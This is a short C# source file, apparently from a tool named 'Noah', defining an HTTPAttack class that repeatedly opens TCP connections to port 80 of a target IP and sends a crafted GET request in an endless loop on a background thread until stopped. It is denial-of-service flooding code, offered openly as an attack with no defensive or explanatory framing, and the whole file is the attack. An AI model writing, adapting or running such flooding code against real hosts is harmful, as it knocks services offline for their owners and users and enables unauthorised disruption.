using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Noah.Attacks
{
    public class HTTPAttack : IAttack
    {
        public string AttackName { get; private set; }

        private string message;
        private ApplicationState state;
        private string ip;

        public HTTPAttack(string host, ApplicationState state)
        {
            StringBuilder sb = new StringBuilder("GET ");
            sb.Append(host);
            sb.AppendLine(" HTTP/1.1");

            message = sb.ToString();
            this.state = state;
            ip = host;
        }

        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            state.State = States.Attacking;

            while (state.State != States.Done)
            {
                TcpClient client = new TcpClient(IPAddress.Parse(ip).ToString(), 80);
                StreamWriter output = new StreamWriter(client.GetStream());
                output.WriteLine(message);
                output.Flush();
                Thread.Sleep(state.Delay);
            }
        }
    }
}